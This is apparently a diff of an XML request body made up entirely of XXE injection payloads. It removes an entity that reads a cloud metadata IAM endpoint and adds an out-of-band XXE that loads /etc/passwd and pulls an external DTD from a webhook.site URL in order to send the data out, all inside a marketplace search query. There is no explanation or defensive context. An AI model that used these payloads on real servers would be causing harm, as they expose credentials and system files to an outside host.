@@ -1,3 +1,14 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
-<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE foo [
+<!ENTITY % b SYSTEM "file:///etc/passwd">
+<!ENTITY % asd SYSTEM "https://webhook.site/c56eb8fb-c218-4977-a0c5-373566eec2f6/xx.html"> %asd; %rrr;]>
+<params>
+<offset>0</offset>
+<queryParams>
+<query>&xxe;</query>
+<sortBy>relevance</sortBy>
+<fieldList>["id", "title"]</fieldList>
+</queryParams>
+<source>marketplace</source>
+<rows>5</rows>
+</params>
